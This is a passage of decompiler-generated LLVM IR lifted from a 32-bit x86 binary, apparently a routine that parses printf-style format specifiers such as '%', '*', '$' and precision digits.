  %v1_804e6fd = mul i32 %v3_804e70a, 4
  store i32 %v1_804e6fd, i32* @ecx, align 4
  %v2_804e704 = load i32, i32* %arg1, align 4
  store i32 %v2_804e704, i32* @edx, align 4
  %v2_804e706 = add i32 %v1_804e6fd, -4
  %v3_804e706 = add i32 %v2_804e706, %v2_804e704
  %v4_804e706 = inttoptr i32 %v3_804e706 to i32*
  %v5_804e706 = load i32, i32* %v4_804e706, align 4
  store i32 %v5_804e706, i32* %eax.global-to-local, align 4
  %v1_804e70a = trunc i32 %v5_804e706 to i8
  %v4_804e70a = add i32 %v2_804e70a, 36
  %v5_804e70a = add i32 %v4_804e70a, %v3_804e70a
  %v6_804e70a = inttoptr i32 %v5_804e70a to i8*
  store i8 %v1_804e70a, i8* %v6_804e70a, align 1
  %v0_804e70e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e70e = urem i32 %v0_804e70e, 256
  %v2_804e70e = load i32, i32* @ebx, align 4
  %v3_804e70e = and i32 %v2_804e70e, -256
  %v4_804e70e = or i32 %v3_804e70e, %v1_804e70e
  store i32 %v4_804e70e, i32* @ebx, align 4
  %v1_804e710 = mul i32 %v0_804e70e, 16777216
  %v2_804e710 = sdiv i32 %v1_804e710, 16777216
  store i32 %v2_804e710, i32* %eax.global-to-local, align 4
  %v1_804e713 = load i32, i32* @edx, align 4
  %v2_804e713 = load i32, i32* @ecx, align 4
  %v3_804e713 = add i32 %v1_804e713, -4
  %v4_804e713 = add i32 %v3_804e713, %v2_804e713
  %v5_804e713 = inttoptr i32 %v4_804e713 to i32*
  %v6_804e713 = load i32, i32* %v5_804e713, align 4
  %v17_804e713 = icmp eq i32 %v2_804e710, %v6_804e713
  %v1_804e717 = icmp eq i1 %v17_804e713, false
  br i1 %v1_804e717, label %dec_label_pc_804ea60, label %dec_label_pc_804e71d

dec_label_pc_804e71d:                             ; preds = %dec_label_pc_804e6f9
  %v3_804e71d = trunc i32 %v0_804e70e to i8
  %v4_804e71d = icmp eq i8 %v3_804e71d, 0
  br i1 %v4_804e71d, label %dec_label_pc_804e727, label %dec_label_pc_804e721

dec_label_pc_804e721:                             ; preds = %dec_label_pc_804e71d
  %v0_804e721 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e721 = add i32 %v0_804e721, 1
  store i32 %v1_804e721, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804e721, 32
  br i1 %tmp175, label %dec_label_pc_804e721.dec_label_pc_804e6f9_crit_edge, label %dec_label_pc_804e727

dec_label_pc_804e721.dec_label_pc_804e6f9_crit_edge: ; preds = %dec_label_pc_804e721
  %v2_804e70a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6f9

dec_label_pc_804e727:                             ; preds = %dec_label_pc_804e721, %dec_label_pc_804e71d
  %v2_804e72c = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804e744.outer

dec_label_pc_804e744.outer:                       ; preds = %dec_label_pc_804e727, %dec_label_pc_804e6e6, %dec_label_pc_804e861
  %v0_804e750.ph94 = phi i32 [ %v1_804e861, %dec_label_pc_804e861 ], [ %v2_804e6e6, %dec_label_pc_804e6e6 ], [ %v2_804e72c, %dec_label_pc_804e727 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804e861 ], [ %tmp66, %dec_label_pc_804e6e6 ], [ %tmp66, %dec_label_pc_804e727 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804e6ea, %dec_label_pc_804e861 ], [ 0, %dec_label_pc_804e6e6 ], [ 0, %dec_label_pc_804e727 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804e861 ], [ %v3_804e6d4, %dec_label_pc_804e6e6 ], [ %v3_804e6d4, %dec_label_pc_804e727 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804e861 ], [ 0, %dec_label_pc_804e6e6 ], [ 0, %dec_label_pc_804e727 ]
  %v7_804e74b = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804e74b = trunc i64 %v7_804e74b to i32
  %v2_804e753 = add i32 %v8_804e74b, 80
  br label %dec_label_pc_804e744

dec_label_pc_804e744:                             ; preds = %dec_label_pc_804e744.outer, %dec_label_pc_804e801
  %v0_804e750 = phi i32 [ %v0_804e80e, %dec_label_pc_804e801 ], [ %v0_804e750.ph94, %dec_label_pc_804e744.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804e801 ], [ %stack_var_-32.1.ph, %dec_label_pc_804e744.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804e801 ], [ %stack_var_-88.1.ph, %dec_label_pc_804e744.outer ]
  store i32 %v0_804e750, i32* @edx, align 4
  store i32 %v0_804e750, i32* @esi, align 4
  %v1_804e746 = inttoptr i32 %v0_804e750 to i8*
  %v2_804e746 = load i8, i8* %v1_804e746, align 1
  %v11_804e746 = icmp eq i8 %v2_804e746, 42
  %v1_804e749 = icmp eq i1 %v11_804e746, false
  br i1 %v1_804e749, label %dec_label_pc_804e75b, label %dec_label_pc_804e74b

dec_label_pc_804e74b:                             ; preds = %dec_label_pc_804e744
  store i32 %v8_804e74b, i32* %eax.global-to-local, align 4
  %v1_804e750 = add i32 %v0_804e750, 1
  store i32 %v1_804e750, i32* @esi, align 4
  %v0_804e753 = load i32, i32* @esp, align 4
  %v3_804e753 = add i32 %v2_804e753, %v0_804e753
  %v4_804e753 = inttoptr i32 %v3_804e753 to i32*
  store i32 0, i32* %v4_804e753, align 4
  %v0_804e775.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e75b

dec_label_pc_804e75b:                             ; preds = %dec_label_pc_804e744, %dec_label_pc_804e74b
  %v0_804e775.pre = phi i32 [ %v0_804e750, %dec_label_pc_804e744 ], [ %v0_804e775.pre.pre, %dec_label_pc_804e74b ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804e75d = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804e75d, i32* %ebp.global-to-local, align 4
  %v4_804e775.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e775124 = inttoptr i32 %v0_804e775.pre to i8*
  %v2_804e775125 = load i8, i8* %v1_804e775124, align 1
  %v3_804e775126 = zext i8 %v2_804e775125 to i32
  %v5_804e775127 = and i32 %v4_804e775.pre, -256
  %v6_804e775128 = or i32 %v3_804e775126, %v5_804e775127
  store i32 %v6_804e775128, i32* %eax.global-to-local, align 4
  %v2_804e777129 = sext i8 %v2_804e775125 to i32
  store i32 %v2_804e777129, i32* @ecx, align 4
  %v2_804e77a130 = mul nsw i32 %v2_804e777129, 2
  %v3_804e77a131 = add i32 %v2_804e77a130, %v0_804e75d
  %v4_804e77a132 = inttoptr i32 %v3_804e77a131 to i8*
  %v5_804e77a133 = load i8, i8* %v4_804e77a132, align 1
  %v6_804e77a134 = and i8 %v5_804e77a133, 8
  %v7_804e77a135 = icmp eq i8 %v6_804e77a134, 0
  %v1_804e77f136 = icmp eq i1 %v7_804e77a135, false
  br i1 %v1_804e77f136, label %dec_label_pc_804e765, label %dec_label_pc_804e781

dec_label_pc_804e765:                             ; preds = %dec_label_pc_804e75b, %dec_label_pc_804e774
  %v2_804e777140 = phi i32 [ %v2_804e777, %dec_label_pc_804e774 ], [ %v2_804e777129, %dec_label_pc_804e75b ]
  %v6_804e775139 = phi i32 [ %v6_804e775, %dec_label_pc_804e774 ], [ %v6_804e775128, %dec_label_pc_804e75b ]
  %v0_804e774138 = phi i32 [ %v1_804e774, %dec_label_pc_804e774 ], [ %v0_804e775.pre, %dec_label_pc_804e75b ]
  %v1_804e76d137 = phi i32 [ %v0_804e78f32, %dec_label_pc_804e774 ], [ 0, %dec_label_pc_804e75b ]
  %v1_804e765 = add i32 %v1_804e76d137, -4094
  %v6_804e765 = sub i32 4093, %v1_804e76d137
  %v7_804e765 = and i32 %v6_804e765, %v1_804e76d137
  %v8_804e765 = icmp slt i32 %v7_804e765, 0
  %v9_804e765 = icmp eq i32 %v1_804e765, 0
  %v10_804e765 = icmp slt i32 %v1_804e765, 0
  %v3_804e76b = icmp eq i1 %v10_804e765, %v8_804e765
  %v4_804e76b = icmp eq i1 %v9_804e765, false
  %v5_804e76b = and i1 %v4_804e76b, %v3_804e76b
  br i1 %v5_804e76b, label %dec_label_pc_804e774, label %dec_label_pc_804e76d

dec_label_pc_804e76d:                             ; preds = %dec_label_pc_804e765
  %v3_804e76d = mul i32 %v1_804e76d137, 10
  store i32 %v3_804e76d, i32* %eax.global-to-local, align 4
  %v2_804e770 = add i32 %v3_804e76d, -48
  %v3_804e770 = add i32 %v2_804e770, %v2_804e777140
  store i32 %v3_804e770, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e774

dec_label_pc_804e774:                             ; preds = %dec_label_pc_804e765, %dec_label_pc_804e76d
  %v0_804e78f32 = phi i32 [ %v1_804e76d137, %dec_label_pc_804e765 ], [ %v3_804e770, %dec_label_pc_804e76d ]
  %v4_804e77528 = phi i32 [ %v6_804e775139, %dec_label_pc_804e765 ], [ %v3_804e76d, %dec_label_pc_804e76d ]
  %v1_804e774 = add i32 %v0_804e774138, 1
  store i32 %v1_804e774, i32* @esi, align 4
  %v1_804e775 = inttoptr i32 %v1_804e774 to i8*
  %v2_804e775 = load i8, i8* %v1_804e775, align 1
  %v3_804e775 = zext i8 %v2_804e775 to i32
  %v5_804e775 = and i32 %v4_804e77528, -256
  %v6_804e775 = or i32 %v3_804e775, %v5_804e775
  store i32 %v6_804e775, i32* %eax.global-to-local, align 4
  %v2_804e777 = sext i8 %v2_804e775 to i32
  store i32 %v2_804e777, i32* @ecx, align 4
  %v2_804e77a = mul nsw i32 %v2_804e777, 2
  %v3_804e77a = add i32 %v2_804e77a, %v0_804e75d
  %v4_804e77a = inttoptr i32 %v3_804e77a to i8*
  %v5_804e77a = load i8, i8* %v4_804e77a, align 1
  %v6_804e77a = and i8 %v5_804e77a, 8
  %v7_804e77a = icmp eq i8 %v6_804e77a, 0
  %v1_804e77f = icmp eq i1 %v7_804e77a, false
  br i1 %v1_804e77f, label %dec_label_pc_804e765, label %dec_label_pc_804e781

dec_label_pc_804e781:                             ; preds = %dec_label_pc_804e774, %dec_label_pc_804e75b
  %v1_804e76d.lcssa = phi i32 [ 0, %dec_label_pc_804e75b ], [ %v0_804e78f32, %dec_label_pc_804e774 ]
  %v0_804e774.lcssa = phi i32 [ %v0_804e775.pre, %dec_label_pc_804e75b ], [ %v1_804e774, %dec_label_pc_804e774 ]
  %v2_804e775.lcssa = phi i8 [ %v2_804e775125, %dec_label_pc_804e75b ], [ %v2_804e775, %dec_label_pc_804e774 ]
  %v6_804e775.lcssa = phi i32 [ %v6_804e775128, %dec_label_pc_804e75b ], [ %v6_804e775, %dec_label_pc_804e774 ]
  %v0_804e781 = load i32, i32* @edx, align 4
  %v1_804e781 = add i32 %v0_804e781, -1
  %v2_804e781 = inttoptr i32 %v1_804e781 to i8*
  %v3_804e781 = load i8, i8* %v2_804e781, align 1
  %v12_804e781 = icmp eq i8 %v3_804e781, 37
  %v1_804e785 = icmp eq i1 %v12_804e781, false
  br i1 %v1_804e785, label %dec_label_pc_804e818, label %dec_label_pc_804e78b

dec_label_pc_804e78b:                             ; preds = %dec_label_pc_804e781
  %v10_804e78b = icmp eq i8 %v2_804e775.lcssa, 36
  %v1_804e78d = icmp eq i1 %v10_804e78b, false
  br i1 %v1_804e78d, label %dec_label_pc_804e7bf, label %dec_label_pc_804e78f

dec_label_pc_804e78f:                             ; preds = %dec_label_pc_804e78b
  %tmp89 = icmp slt i32 %v1_804e76d.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804e7bf, label %dec_label_pc_804e793

dec_label_pc_804e793:                             ; preds = %dec_label_pc_804e78f
  %v1_804e793 = add i32 %v0_804e774.lcssa, 1
  store i32 %v1_804e793, i32* @edx, align 4
  %v4_804e796 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804e796, label %dec_label_pc_804ea60, label %dec_label_pc_804e7a1

dec_label_pc_804e7a1:                             ; preds = %dec_label_pc_804e793
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804e7a9 = sub i32 %v1_804e76d.lcssa, %stack_var_-88.1
  %v8_804e7a9 = xor i32 %v1_804e76d.lcssa, %stack_var_-88.1
  %v9_804e7a9 = xor i32 %v2_804e7a9, %v1_804e76d.lcssa
  %v10_804e7a9 = and i32 %v9_804e7a9, %v8_804e7a9
  %v11_804e7a9 = icmp slt i32 %v10_804e7a9, 0
  %v12_804e7a9 = icmp eq i32 %v2_804e7a9, 0
  %v13_804e7a9 = icmp slt i32 %v2_804e7a9, 0
  %v3_804e7ab = icmp ne i1 %v13_804e7a9, %v11_804e7a9
  %v4_804e7ab = or i1 %v12_804e7a9, %v3_804e7ab
  %stack_var_-88.1.v0_804e7ad = select i1 %v4_804e7ab, i32 %stack_var_-88.1, i32 %v1_804e76d.lcssa
  br label %dec_label_pc_804e7bb

dec_label_pc_804e7bb:                             ; preds = %dec_label_pc_804e7cf, %dec_label_pc_804e7a1, %dec_label_pc_804e7d3
  %v0_804e7bb = phi i32 [ %v1_804e793, %dec_label_pc_804e7a1 ], [ %v0_804e781, %dec_label_pc_804e7d3 ], [ %v0_804e781, %dec_label_pc_804e7cf ]
  %stack_var_-32.2 = phi i32 [ %v1_804e76d.lcssa, %dec_label_pc_804e7a1 ], [ %stack_var_-32.1, %dec_label_pc_804e7d3 ], [ %stack_var_-32.1, %dec_label_pc_804e7cf ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804e7ad, %dec_label_pc_804e7a1 ], [ 0, %dec_label_pc_804e7d3 ], [ 0, %dec_label_pc_804e7cf ]
  store i32 %v0_804e7bb, i32* @esi, align 4
  br label %dec_label_pc_804e7e2

dec_label_pc_804e7bf:                             ; preds = %dec_label_pc_804e78f, %dec_label_pc_804e78b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804e7cf, label %dec_label_pc_804e7c6

dec_label_pc_804e7c6:                             ; preds = %dec_label_pc_804e7bf
  %v10_804e7c6 = icmp eq i8 %v2_804e775.lcssa, 109
  br i1 %v10_804e7c6, label %dec_label_pc_804e818, label %dec_label_pc_804ea60

dec_label_pc_804e7cf:                             ; preds = %dec_label_pc_804e7bf
  %tmp176 = icmp ugt i32 %v0_804e774.lcssa, %v0_804e781
  br i1 %tmp176, label %dec_label_pc_804e7d3, label %dec_label_pc_804e7bb

dec_label_pc_804e7d3:                             ; preds = %dec_label_pc_804e7cf
  %v1_804e7d3 = inttoptr i32 %v0_804e781 to i8*
  %v2_804e7d3 = load i8, i8* %v1_804e7d3, align 1
  %v8_804e7d3 = icmp eq i8 %v2_804e7d3, 48
  br i1 %v8_804e7d3, label %dec_label_pc_804e7bb, label %dec_label_pc_804e818

dec_label_pc_804e7e2:                             ; preds = %dec_label_pc_804e7f3, %dec_label_pc_804e7bb
  %v0_804e80e = phi i32 [ %v1_804e7f3, %dec_label_pc_804e7f3 ], [ %v0_804e7bb, %dec_label_pc_804e7bb ]
  %v4_804e7ec35 = phi i32 [ %v6_804e7ec, %dec_label_pc_804e7f3 ], [ %v6_804e775.lcssa, %dec_label_pc_804e7bb ]
  store i32 ptrtoint ([8 x i8]* @global_var_80509f2.119 to i32), i32* %edx.global-to-local, align 4
  %v1_804e7ef = inttoptr i32 %v0_804e80e to i8*
  br label %dec_label_pc_804e7ec

dec_label_pc_804e7ec:                             ; preds = %dec_label_pc_804e7fd, %dec_label_pc_804e7e2
  %v4_804e7ec = phi i32 [ %v4_804e7ec35, %dec_label_pc_804e7e2 ], [ %v6_804e7ec, %dec_label_pc_804e7fd ]
  %v0_804e7ee = phi i32 [ ptrtoint ([8 x i8]* @global_var_80509f2.119 to i32), %dec_label_pc_804e7e2 ], [ %v1_804e7ee, %dec_label_pc_804e7fd ]
  %v0_804e7fd = phi i32 [ 1, %dec_label_pc_804e7e2 ], [ %v2_804e7fd, %dec_label_pc_804e7fd ]
  store i32 %v0_804e7fd, i32* @ecx, align 4
  %v1_804e7ec = inttoptr i32 %v0_804e7ee to i8*
  %v2_804e7ec = load i8, i8* %v1_804e7ec, align 1
  %v3_804e7ec = zext i8 %v2_804e7ec to i32
  %v5_804e7ec = and i32 %v4_804e7ec, -256
  %v6_804e7ec = or i32 %v3_804e7ec, %v5_804e7ec
  store i32 %v6_804e7ec, i32* %eax.global-to-local, align 4
  %v1_804e7ee = add i32 %v0_804e7ee, 1
  store i32 %v1_804e7ee, i32* @edx, align 4
  %v2_804e7ef = load i8, i8* %v1_804e7ef, align 1
  %v15_804e7ef = icmp eq i8 %v2_804e7ef, %v2_804e7ec
  %v1_804e7f1 = icmp eq i1 %v15_804e7ef, false
  br i1 %v1_804e7f1, label %dec_label_pc_804e7f8, label %dec_label_pc_804e7f3

dec_label_pc_804e7f3:                             ; preds = %dec_label_pc_804e7ec
  %v1_804e7f3 = add i32 %v0_804e80e, 1
  store i32 %v1_804e7f3, i32* @esi, align 4
  %v0_804e7f4 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e7f4 = or i32 %v0_804e7f4, %v0_804e7fd
  store i32 %v2_804e7f4, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e7e2

dec_label_pc_804e7f8:                             ; preds = %dec_label_pc_804e7ec
  %v1_804e7f8 = inttoptr i32 %v1_804e7ee to i8*
  %v2_804e7f8 = load i8, i8* %v1_804e7f8, align 1
  %v3_804e7f8 = icmp eq i8 %v2_804e7f8, 0
  br i1 %v3_804e7f8, label %dec_label_pc_804e801, label %dec_label_pc_804e7fd

dec_label_pc_804e7fd:                             ; preds = %dec_label_pc_804e7f8
  %v2_804e7fd = mul i32 %v0_804e7fd, 2
  br label %dec_label_pc_804e7ec

dec_label_pc_804e801:                             ; preds = %dec_label_pc_804e7f8
  %v0_804e801 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804e805 = udiv i32 %v0_804e801, 2
  %v1_804e805.not = or i32 %v1_804e805, -6
  %v1_804e80a = xor i32 %v1_804e805.not, 5
  store i32 %v1_804e80a, i32* %eax.global-to-local, align 4
  %v2_804e80c = and i32 %v1_804e80a, %v0_804e801
  store i32 %v2_804e80c, i32* %edi.global-to-local, align 4
  %v1_804e80e = add i32 %v0_804e80e, -1
  %v2_804e80e = inttoptr i32 %v1_804e80e to i8*
  %v3_804e80e = load i8, i8* %v2_804e80e, align 1
  %v12_804e80e = icmp eq i8 %v3_804e80e, 37
  %v1_804e812 = icmp eq i1 %v12_804e80e, false
  br i1 %v1_804e812, label %dec_label_pc_804e744, label %dec_label_pc_804e818

dec_label_pc_804e818:                             ; preds = %dec_label_pc_804e7d3, %dec_label_pc_804e801, %dec_label_pc_804e781, %dec_label_pc_804e7c6
  %v0_804e83b = phi i32 [ %v1_804e76d.lcssa, %dec_label_pc_804e7c6 ], [ %v1_804e76d.lcssa, %dec_label_pc_804e7d3 ], [ 0, %dec_label_pc_804e801 ], [ %v1_804e76d.lcssa, %dec_label_pc_804e781 ]
  %v1_804e844 = phi i32 [ %v0_804e774.lcssa, %dec_label_pc_804e7c6 ], [ %v0_804e774.lcssa, %dec_label_pc_804e7d3 ], [ %v0_804e80e, %dec_label_pc_804e801 ], [ %v0_804e774.lcssa, %dec_label_pc_804e781 ]
  %v0_804e841 = phi i32 [ %v0_804e781, %dec_label_pc_804e7c6 ], [ %v0_804e781, %dec_label_pc_804e7d3 ], [ %v1_804e7ee, %dec_label_pc_804e801 ], [ %v0_804e781, %dec_label_pc_804e781 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804e7c6 ], [ %stack_var_-32.1, %dec_label_pc_804e7d3 ], [ %stack_var_-32.2, %dec_label_pc_804e801 ], [ %stack_var_-32.1, %dec_label_pc_804e781 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804e7c6 ], [ 0, %dec_label_pc_804e7d3 ], [ %stack_var_-88.2, %dec_label_pc_804e801 ], [ %stack_var_-88.1, %dec_label_pc_804e781 ]
  %v1_804e818 = inttoptr i32 %v0_804e841 to i8*
  %v2_804e818 = load i8, i8* %v1_804e818, align 1
  %v11_804e818 = icmp eq i8 %v2_804e818, 42
  %v1_804e81b = icmp eq i1 %v11_804e818, false
  br i1 %v1_804e81b, label %dec_label_pc_804e851, label %dec_label_pc_804e81d

dec_label_pc_804e81d:                             ; preds = %dec_label_pc_804e818
  %v4_804e81d = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804e81d, label %dec_label_pc_804e841, label %dec_label_pc_804e824

dec_label_pc_804e824:                             ; preds = %dec_label_pc_804e81d
  %v1_804e824 = inttoptr i32 %v1_804e844 to i8*
  %v2_804e824 = load i8, i8* %v1_804e824, align 1
  %v11_804e824 = icmp eq i8 %v2_804e824, 36
  %v1_804e827 = icmp eq i1 %v11_804e824, false
  br i1 %v1_804e827, label %dec_label_pc_804ea60, label %dec_label_pc_804e82d

dec_label_pc_804e82d:                             ; preds = %dec_label_pc_804e824
  %tmp91 = icmp slt i32 %v0_804e83b, 1
  br i1 %tmp91, label %dec_label_pc_804ea60, label %dec_label_pc_804e835

dec_label_pc_804e835:                             ; preds = %dec_label_pc_804e82d
  store i32 %v8_804e74b, i32* %eax.global-to-local, align 4
  %v1_804e83a = add i32 %v1_804e844, 1
  store i32 %v1_804e83a, i32* @esi, align 4
  %v1_804e83b = load i32, i32* @esp, align 4
  %v3_804e83b = add i32 %v8_804e74b, 68
  %v4_804e83b = add i32 %v3_804e83b, %v1_804e83b
  %v5_804e83b = inttoptr i32 %v4_804e83b to i32*
  store i32 %v0_804e83b, i32* %v5_804e83b, align 4
  %v0_804e87f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e84c

dec_label_pc_804e841:                             ; preds = %dec_label_pc_804e81d
  %v1_804e841 = add i32 %v0_804e841, 1
  store i32 %v1_804e841, i32* %eax.global-to-local, align 4
  %v12_804e844 = icmp eq i32 %v1_804e841, %v1_804e844
  %v1_804e846 = icmp eq i1 %v12_804e844, false
  br i1 %v1_804e846, label %dec_label_pc_804ea60, label %dec_label_pc_804e84c

dec_label_pc_804e84c:                             ; preds = %dec_label_pc_804e841, %dec_label_pc_804e835
  %v0_804e87f.pre.pre.pre = phi i32 [ %v1_804e844, %dec_label_pc_804e841 ], [ %v0_804e87f.pre.pre.pre.pre, %dec_label_pc_804e835 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e851

dec_label_pc_804e851:                             ; preds = %dec_label_pc_804e818, %dec_label_pc_804e84c
  %v0_804e87f.pre.pre = phi i32 [ %v1_804e844, %dec_label_pc_804e818 ], [ %v0_804e87f.pre.pre.pre, %dec_label_pc_804e84c ]
  %v0_804e6ea = phi i32 [ %v0_804e83b, %dec_label_pc_804e818 ], [ -2147483648, %dec_label_pc_804e84c ]
  %v4_804e851 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804e851 = icmp eq i32 %v4_804e851, 0
  %v1_804e856 = icmp eq i1 %v5_804e851, false
  %.pre = inttoptr i32 %v0_804e87f.pre.pre to i8*
  br i1 %v1_804e856, label %dec_label_pc_804e87a, label %dec_label_pc_804e85c

dec_label_pc_804e85c:                             ; preds = %dec_label_pc_804e851
  %v2_804e85c = load i8, i8* %.pre, align 1
  %v11_804e85c = icmp eq i8 %v2_804e85c, 46
  %v1_804e85f = icmp eq i1 %v11_804e85c, false
  br i1 %v1_804e85f, label %dec_label_pc_804e873, label %dec_label_pc_804e861

dec_label_pc_804e861:                             ; preds = %dec_label_pc_804e85c
  %v1_804e861 = add i32 %v0_804e87f.pre.pre, 1
  store i32 %v1_804e861, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e744.outer

dec_label_pc_804e873:                             ; preds = %dec_label_pc_804e85c
  br label %dec_label_pc_804e87a

dec_label_pc_804e87a:                             ; preds = %dec_label_pc_804e851, %dec_label_pc_804e873
  %stack_var_-96.2 = phi i32 [ %v0_804e6ea, %dec_label_pc_804e873 ], [ %stack_var_-96.1.ph, %dec_label_pc_804e851 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804e873 ], [ %v0_804e6ea, %dec_label_pc_804e851 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80509a0.120 to i32), i32* @edx, align 4
  %v4_804e87f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e87f

dec_label_pc_804e87f:                             ; preds = %dec_label_pc_804e889, %dec_label_pc_804e87a
  %v0_804e889 = phi i32 [ %v1_804e889, %dec_label_pc_804e889 ], [ ptrtoint ([9 x i8]* @global_var_80509a0.120 to i32), %dec_label_pc_804e87a ]
  %v4_804e87f = phi i32 [ %v6_804e87f, %dec_label_pc_804e889 ], [ %v4_804e87f.pre, %dec_label_pc_804e87a ]
  %v2_804e87f = load i8, i8* %.pre, align 1
  %v3_804e87f = zext i8 %v2_804e87f to i32
  %v5_804e87f = and i32 %v4_804e87f, -256
  %v6_804e87f = or i32 %v3_804e87f, %v5_804e87f
  store i32 %v6_804e87f, i32* %eax.global-to-local, align 4
  %v3_804e881 = inttoptr i32 %v0_804e889 to i8*
  %v4_804e881 = load i8, i8* %v3_804e881, align 1
  %v15_804e881 = icmp eq i8 %v2_804e87f, %v4_804e881
  br i1 %v15_804e881, label %dec_label_pc_804e6f1, label %dec_label_pc_804e889

dec_label_pc_804e889:                             ; preds = %dec_label_pc_804e87f
  %v1_804e889 = add i32 %v0_804e889, 1
  store i32 %v1_804e889, i32* @edx, align 4
  %v1_804e88a = inttoptr i32 %v1_804e889 to i8*
  %v2_804e88a = load i8, i8* %v1_804e88a, align 1
  %v3_804e88a = icmp eq i8 %v2_804e88a, 0
  %v1_804e88d = icmp eq i1 %v3_804e88a, false
  br i1 %v1_804e88d, label %dec_label_pc_804e87f, label %dec_label_pc_804e88f

dec_label_pc_804e88f:                             ; preds = %dec_label_pc_804e889, %dec_label_pc_804e6f1
  %v0_804e8a2 = phi i32 [ %v1_804e6f1, %dec_label_pc_804e6f1 ], [ %v0_804e87f.pre.pre, %dec_label_pc_804e889 ]
  %v0_804e89f = phi i32 [ %v0_804e889, %dec_label_pc_804e6f1 ], [ %v1_804e889, %dec_label_pc_804e889 ]
  %v1_804e891 = add i32 %v0_804e89f, -134547872
  %v1_804e896 = add i32 %v0_804e89f, -134547873
  %v5_804e896 = sub i32 134547872, %v0_804e89f
  %v6_804e896 = and i32 %v1_804e891, %v5_804e896
  %v7_804e896 = icmp slt i32 %v6_804e896, 0
  %v8_804e896 = icmp eq i32 %v1_804e896, 0
  %v9_804e896 = icmp slt i32 %v1_804e896, 0
  store i32 %v1_804e896, i32* %eax.global-to-local, align 4
  %v3_804e897 = icmp eq i1 %v9_804e896, %v7_804e896
  %v4_804e897 = icmp eq i1 %v8_804e896, false
  %v5_804e897 = and i1 %v4_804e897, %v3_804e897
  br i1 %v5_804e897, label %dec_label_pc_804e8a3, label %dec_label_pc_804e899

dec_label_pc_804e899:                             ; preds = %dec_label_pc_804e88f
  %v1_804e899 = inttoptr i32 %v0_804e8a2 to i8*
  %v2_804e899 = load i8, i8* %v1_804e899, align 1
  %v3_804e899 = zext i8 %v2_804e899 to i32
  %v5_804e899 = and i32 %v1_804e896, -256
  %v6_804e899 = or i32 %v3_804e899, %v5_804e899
  store i32 %v6_804e899, i32* %eax.global-to-local, align 4
  %v3_804e89b = inttoptr i32 %v0_804e89f to i8*
  %v4_804e89b = load i8, i8* %v3_804e89b, align 1
  %v15_804e89b = icmp eq i8 %v2_804e899, %v4_804e89b
  %v1_804e89d = icmp eq i1 %v15_804e89b, false
  br i1 %v1_804e89d, label %dec_label_pc_804e8a3, label %dec_label_pc_804e89f

dec_label_pc_804e89f:                             ; preds = %dec_label_pc_804e899
  %v1_804e89f = add i32 %v0_804e89f, 9
  store i32 %v1_804e89f, i32* @edx, align 4
  %v1_804e8a2 = add i32 %v0_804e8a2, 1
  store i32 %v1_804e8a2, i32* @esi, align 4
  br label %dec_label_pc_804e8a3

dec_label_pc_804e8a3:                             ; preds = %dec_label_pc_804e899, %dec_label_pc_804e88f, %dec_label_pc_804e89f
  %v4_804e8aa = phi i32 [ %v6_804e899, %dec_label_pc_804e899 ], [ %v1_804e896, %dec_label_pc_804e88f ], [ %v6_804e899, %dec_label_pc_804e89f ]
  %v0_804e8aa = phi i32 [ %v0_804e8a2, %dec_label_pc_804e899 ], [ %v0_804e8a2, %dec_label_pc_804e88f ], [ %v1_804e8a2, %dec_label_pc_804e89f ]
  %v0_804e8a3 = phi i32 [ %v0_804e89f, %dec_label_pc_804e899 ], [ %v0_804e89f, %dec_label_pc_804e88f ], [ %v1_804e89f, %dec_label_pc_804e89f ]
  %v1_804e8a3 = add i32 %v0_804e8a3, 9
  %v2_804e8a3 = inttoptr i32 %v1_804e8a3 to i8*
  %v3_804e8a3 = load i8, i8* %v2_804e8a3, align 1
  %v4_804e8a3 = sext i8 %v3_804e8a3 to i32
  %v2_804e8a7 = mul nsw i32 %v4_804e8a3, 256
  store i32 %v2_804e8a7, i32* %ebx.global-to-local, align 4
  %v1_804e8aa = inttoptr i32 %v0_804e8aa to i8*
  %v2_804e8aa = load i8, i8* %v1_804e8aa, align 1
  %v3_804e8aa = zext i8 %v2_804e8aa to i32
  %v5_804e8aa = and i32 %v4_804e8aa, -256
  %v6_804e8aa = or i32 %v3_804e8aa, %v5_804e8aa
